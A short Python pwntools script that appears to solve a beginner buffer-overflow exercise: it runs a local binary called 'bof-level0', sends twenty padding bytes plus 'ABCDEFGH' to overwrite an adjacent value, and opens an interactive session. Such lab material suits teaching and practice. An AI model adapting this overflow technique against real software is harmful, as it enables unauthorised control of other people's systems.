#!/usr/bin/env python

from pwn import *

p = process("./bof-level0")

print(p.recv())

p.sendline("A" * 20 + "ABCDEFGH")

p.interactive()
